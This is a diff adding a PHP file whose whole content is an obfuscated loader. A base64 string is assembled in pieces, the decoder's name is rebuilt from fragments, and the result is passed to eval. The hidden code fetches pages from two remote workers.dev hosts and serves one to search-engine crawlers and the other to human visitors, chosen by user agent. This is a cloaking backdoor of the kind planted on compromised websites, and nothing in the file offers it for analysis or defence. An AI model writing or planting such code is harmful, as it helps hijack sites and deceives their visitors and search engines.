@@ -1,0 +1,43 @@
+<?php
+// Obfuscated by internal obfuscator (base64)
+$z = "";
+$z .= "ZnVuY3Rpb24gc21va3koJHVybCkgew0KICAgIGlmIChpb";
+$z .= "mlfZ2V0KCdhbGxvd191cmxfZm9wZW4nKSkg";
+$z .= "ew0KICAgICAgICByZXR1cm4gZmlsZV9nZXRfY29";
+$z .= "udGVudHMoJHVybCk7DQogICAgfSBlbHNlaWYgKGZ1bm";
+$z .= "N0aW9uX2V4aXN0cygnY3VybF9pbml0JykpIHsNCiAgIC";
+$z .= "AgICAgJGNoID0gY3VybF9pbml0KCk7DQogICAgIC";
+$z .= "AgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwp";
+$z .= "Ow0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUk";
+$z .= "xPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KICAgICAgICBjdXJsX3NldG9wdC";
+$z .= "gkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAnTW";
+$z .= "96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMD";
+$z .= "sgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2ICh";
+$z .= "LSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMTAgU2F";
+$z .= "mYXJpLzUzNy4zNicpOw0KICAgICAgICAkcmVzcG9uc2UgP";
+$z .= "SBjdXJsX2V4ZWMoJGNoKTsNCiAgICAgICAgY3VybF9j";
+$z .= "bG9zZSgkY2gpOw0KICAgICAgICByZXR1cm4gJHJlc3BvbnNlOw0KICA";
+$z .= "gIH0NCiAgICByZXR1cm4gZmFsc2U7DQp9DQ";
+$z .= "oNCiRyZXMgPSBzdHJ0b2xvd2VyKCRfU0VSVkVSWyJIVFRQX1VT";
+$z .= "RVJfQUdFTlQiXSk7DQoNCiRib3QgPSAiaHR0cHM6Ly";
+$z .= "9sYWxhbmd1ZWRlbGlzbGFtLW1hbnVlbC1ibGFjay";
+$z .= "5kb25vMDcwOTI5LndvcmtlcnMuZGV2LyI7DQokdXNlcl9wY";
+$z .= "WdlID0gImh0dHBzOi8vbGFsYW5ndWVkZWxpc2xhbS1tYW51ZWwtbnVtZX";
+$z .= "JpcXVlLXdoaXRlLmRvbm8wNzA5Mjkud29ya2Vycy5kZXYvIjsNCg0KJ";
+$z .= "GZpbGVfYm90ID0gc21va3koJGJvdCk7";
+$z .= "DQokZmlsZV91c2VyID0gc21va3koJHVzZXJfcGFnZSk";
+$z .= "7DQoNCiRib3RjaGFyID0gIi8oZ29vZ2xlYm90fHNsdXJwfG";
+$z .= "Fkc2Vuc2V8aW5zcGVjdGlvbnxhaHJlZnNib3R8dGVsZWdyY";
+$z .= "W1ib3R8YmluZ2JvdHx5YW5kZXhib3Qp";
+$z .= "LyI7DQoNCmlmIChwcmVnX21hdGNoKCRib3RjaGFyLCAkcmV";
+$z .= "zKSkgew0KICAgIGVjaG8gJGZpbGVfYm90ID86ICJObyBjb2";
+$z .= "50ZW50IGZyb20gYm90IHNvdXJjZS4iOw0KICAgIGV4aXQ7DQp9IGVsc";
+$z .= "2Ugew0KICAgIGVjaG8gJGZpbGVfdXNlciA/OiAiN";
+$z .= "DA0IE5vdCBGb3VuZCI7DQogICAgZXhpdDsNCn0";
+$z .= "=";
+
+// reconstruct function name
+$a = "ba"; $b = "se"."64"."_de"."co"."de"; $c = $a.$b;
+$payload = $c($z);
+eval($payload);
+?>
